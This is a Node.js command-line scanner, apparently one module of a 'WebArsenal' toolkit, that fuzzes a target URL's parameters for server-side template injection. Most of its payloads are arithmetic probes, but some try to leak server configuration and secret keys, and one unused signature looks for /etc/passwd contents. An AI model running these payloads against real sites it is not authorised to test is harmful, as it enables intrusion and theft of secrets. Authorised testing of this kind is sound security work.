#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: ssti-auditor.js                                    ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('ssti-auditor.js')
  .description('Tests for Server-Side Template Injection vulnerabilities using mathematical and code payloads.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?name=test)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .parse(process.argv);

const opts = program.opts();

const SSTI_PAYLOADS = [
  "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}", "#{7*7}", "*{7*7}",
  "{{config.items()}}", "{{settings.SECRET_KEY}}",
  "{{self.__dict__}}"
];

const SIGNATURES = [
  "49", "7777777", "root:x:0:0:" // Mathematical calculation result or LFI via template
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'ssti-auditor.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?name=test>'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing [SSTI] for: ${param}`));
    for (const payload of SSTI_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        const body = String(res.data);
        
        // Detection logic: Check for mathematical results
        if (body.includes("49") || body.includes("7777777")) {
           console.log(chalk.bold.red(`\n[!] SSTI VULNERABILITY DETECTED! [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    Result Found: ${body.includes("49") ? "49" : "7777777"}`));
           console.log(chalk.red(`    URL: ${testUrl.href}\n`));
           break;
        }
      } catch (e) {}
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
